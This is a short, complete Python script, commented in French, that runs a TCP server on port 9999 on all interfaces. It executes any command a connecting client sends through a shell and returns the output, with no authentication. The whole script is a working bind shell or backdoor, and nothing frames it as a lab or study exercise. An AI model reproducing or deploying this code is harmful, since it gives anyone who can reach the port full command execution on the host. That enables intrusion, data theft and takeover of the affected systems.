import socket
import subprocess

def execute_command(command):
    try:
        # Exécute la commande et récupère la sortie
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output
    except Exception as e:
        # En cas d'erreur, retourne le message d'erreur
        return str(e).encode()

def main():
    # Paramètres du serveur
    host = ''  # Écoute sur toutes les interfaces disponibles
    port = 9999

    # Crée un socket TCP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Lie le socket à l'adresse et au port spécifiés
    server_socket.bind((host, port))

    # Écoute les connexions entrantes
    server_socket.listen(5)

    print(f"Serveur à l'écoute sur le port {port}...")

    while True:
        # Accepte une nouvelle connexion
        client_socket, client_address = server_socket.accept()
        print(f"Connexion entrante de {client_address}")

        while True:
            # Attend une commande du client
            command = client_socket.recv(1024).decode()

            # Si la commande est vide, ferme la connexion
            if not command:
                break

            # Exécute la commande et récupère la sortie
            output = execute_command(command)

            # Envoie la sortie au client
            client_socket.send(output)

        # Ferme la connexion avec le client
        client_socket.close()

    # Ferme le socket du serveur
    server_socket.close()

if __name__ == "__main__":
    main()
